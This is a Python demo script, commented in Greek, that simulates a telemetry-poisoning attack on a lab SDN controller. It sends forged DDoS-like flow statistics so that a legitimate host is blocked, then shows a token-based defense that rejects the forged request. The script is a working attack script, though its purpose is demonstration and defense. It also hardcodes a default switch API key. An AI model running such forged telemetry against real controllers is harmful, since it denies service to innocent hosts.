#!/usr/bin/env python3
"""
flow_injection_attack.py — SDN Control Plane Attack: Telemetry Poisoning
------------------------------------------------------------------------
Σενάριο: Ο επιτιθέμενος ανακαλύπτει το REST API του SDN controller (port 9000)
και στέλνει πλαστά στατιστικά ροής (crafted telemetry) ισχυριζόμενος ότι ένας
νόμιμος host (π.χ. 10.0.0.1) εξαπολύει DDoS επίθεση.

Αποτέλεσμα (χωρίς άμυνα):
  → Ο controller εγκαθιστά DROP rule για τον νόμιμο host → DoS εναντίον αθώου

Αποτέλεσμα (με άμυνα DEFENSE_MODE=1):
  → Ο controller απορρίπτει την αίτηση (401) επειδή η πηγή δεν είναι εγγεγραμμένος switch

Χρήση:
  # Χωρίς άμυνα (δείχνει την ευπάθεια):
  python3 simulation/flow_injection_attack.py

  # Με άμυνα (ο controller πρέπει να τρέχει με DEFENSE_MODE=1):
  DEFENSE_MODE=1 python3 simulation/flow_injection_attack.py
"""

import os
import sys
import time
import json
import requests

CONTROLLER_URL  = os.environ.get("CONTROLLER_URL",  "http://localhost:9000")
SWITCH_API_KEY  = os.environ.get("SWITCH_API_KEY",  "sdn-secret-2024")  # το γνωρίζει μόνο ο νόμιμος switch
LEGITIMATE_HOST = "10.0.0.1"   # ο νόμιμος χρήστης που θα «πλαστογραφηθεί»
VICTIM_HOST     = "10.0.0.5"   # ο υποτιθέμενος στόχος της «επίθεσης»

SEP = "=" * 65


def check_controller():
    try:
        r = requests.get(f"{CONTROLLER_URL}/health", timeout=3)
        info = r.json()
        print(f"[OK] Controller ενεργός — Defense Engine: {info.get('defense_engine')}")
        return True
    except Exception as e:
        print(f"[ERR] Controller μη προσβάσιμος: {e}")
        return False


def register_legitimate_hosts():
    """Προσομοιώνει νόμιμη εγγραφή hosts (όπως κάνει ο switch)."""
    for i in range(1, 6):
        ip = f"10.0.0.{i}"
        requests.post(f"{CONTROLLER_URL}/register",
                      json={"node_id": f"h{i}", "type": "host", "ip": ip},
                      timeout=3)
    print("[OK] Νόμιμοι hosts h1-h5 εγγεγραμμένοι.")


def send_legitimate_telemetry():
    """Φάση 1: φυσιολογική κίνηση — νόμιμος switch στέλνει με το σωστό token."""
    print("\n[Phase 1] Φυσιολογική κίνηση (με X-Switch-Token) — αναμένεται verdict=Normal...")
    headers = {"X-Switch-Token": SWITCH_API_KEY}
    for _ in range(3):
        r = requests.post(f"{CONTROLLER_URL}/telemetry",
                          json={"src": LEGITIMATE_HOST, "dst": VICTIM_HOST,
                                "flows": [[25, 2400, 2]]},
                          headers=headers, timeout=3)
        result = r.json()
        print(f"  → verdict={result.get('verdict')}  action={result.get('action')}")
        time.sleep(1)


def inject_fake_flow(use_token=None):
    """
    Φάση 2: ΕΠΙΘΕΣΗ — στέλνει πλαστά στατιστικά που μοιάζουν με DDoS flood.

    Ο επιτιθέμενος ισχυρίζεται ότι ο 10.0.0.1 στέλνει 50.000 πακέτα/2s
    (αδύνατο για φυσιολογικό χρήστη, ακόμα και με hping3 flood).
    """
    print("\n[Phase 2] ΕΠΙΘΕΣΗ — αποστολή πλαστής telemetry...")
    print(f"  Στόχος: κάνε τον controller να μπλοκάρει τον {LEGITIMATE_HOST}")

    # Ο επιτιθέμενος ΔΕΝ γνωρίζει το SWITCH_API_KEY — στέλνει χωρίς token
    headers = {}

    payload = {
        "src":   LEGITIMATE_HOST,
        "dst":   VICTIM_HOST,
        "flows": [[50_000, 5_000_000, 2]],  # 50k pkts/2s = προφανής flood
    }

    for attempt in range(1, 4):
        try:
            r = requests.post(
                f"{CONTROLLER_URL}/telemetry",
                json=payload,
                headers=headers,
                timeout=3,
            )
            result = r.json()
            if r.status_code == 401:
                print(f"  [Attempt {attempt}] 🛡️  ΑΠΟΡΡΙΦΘΗΚΕ (401): {result.get('error')}")
            elif r.status_code == 200:
                verdict = result.get("verdict")
                action  = result.get("action")
                icon    = "🚨" if verdict == "Attack" else "✅"
                print(f"  [Attempt {attempt}] {icon} verdict={verdict}  action={action}")
        except Exception as e:
            print(f"  [Attempt {attempt}] ERR: {e}")
        time.sleep(0.5)


def check_damage():
    """Ελέγχει αν ο νόμιμος host μπλοκαρίστηκε."""
    print("\n[Check] Κατάσταση flow table μετά την επίθεση:")
    try:
        ft   = requests.get(f"{CONTROLLER_URL}/flow_table", timeout=3).json()
        topo = requests.get(f"{CONTROLLER_URL}/topology",   timeout=3).json()
        stats = requests.get(f"{CONTROLLER_URL}/stats",     timeout=3).json()

        blocked = LEGITIMATE_HOST in ft
        node_status = next(
            (n["status"] for n in topo["nodes"] if n["ip"] == LEGITIMATE_HOST), "unknown"
        )
        inj_attempts = stats.get("injection_attempts", "N/A")

        print(f"  {LEGITIMATE_HOST} στο flow table: {'ΝΑΙ (DROP!)' if blocked else 'ΟΧΙ'}")
        print(f"  {LEGITIMATE_HOST} status: {node_status}")
        print(f"  Injection attempts logged: {inj_attempts}")
        return blocked
    except Exception as e:
        print(f"  ERR: {e}")
        return False


def print_summary(blocked, defense_mode):
    print(f"\n{SEP}")
    if not defense_mode:
        if blocked:
            print("  ΑΠΟΤΕΛΕΣΜΑ (χωρίς άμυνα):")
            print(f"  ❌ Ο νόμιμος host {LEGITIMATE_HOST} ΜΠΛΟΚΑΡΙΣΤΗΚΕ!")
            print("  → Ο επιτιθέμενος επέτυχε DoS εναντίον αθώου χρήστη.")
            print("  → Αιτία: ο controller αποδέχεται telemetry από οποιαδήποτε πηγή.")
        else:
            print(f"  ✅ Ο host {LEGITIMATE_HOST} δεν μπλοκαρίστηκε (IF δεν ανίχνευσε επίθεση).")
    else:
        if not blocked:
            print("  ΑΠΟΤΕΛΕΣΜΑ (με άμυνα DEFENSE_MODE=1):")
            print(f"  ✅ Ο νόμιμος host {LEGITIMATE_HOST} παρέμεινε ΕΝΕΡΓΟΣ.")
            print("  → Η επίθεση injection απορρίφθηκε (μη εξουσιοδοτημένη πηγή).")
        else:
            print(f"  ⚠️  Ο host μπλοκαρίστηκε παρόλη την άμυνα.")
    print(SEP)


def main():
    defense_mode = os.environ.get("DEFENSE_MODE", "0") == "1"

    print(SEP)
    print("  FLOW RULE INJECTION ATTACK — SDN Control Plane")
    print(f"  Controller: {CONTROLLER_URL}")
    print(f"  Defense Mode: {'ΕΝΕΡΓΗ' if defense_mode else 'ΑΝΕΝΕΡΓΗ'}")
    print(SEP)

    if not check_controller():
        sys.exit(1)

    # Καθάρισε προηγούμενη κατάσταση
    try:
        requests.post(f"{CONTROLLER_URL}/reset", timeout=3)
        print("[OK] Controller state reset.")
    except Exception:
        pass

    register_legitimate_hosts()
    send_legitimate_telemetry()
    inject_fake_flow()
    blocked = check_damage()
    print_summary(blocked, defense_mode)

    if not defense_mode and blocked:
        print("\n💡 Για να δεις την άμυνα (DEFENSE_MODE=1):")
        print("   docker compose -f app_sdn/docker-compose.yml stop controller")
        print("   docker run --rm -e DEFENSE_MODE=1 -e SWITCH_API_KEY=sdn-secret-2024 \\")
        print("     ... controller python3 app_sdn/controller.py")


if __name__ == "__main__":
    main()
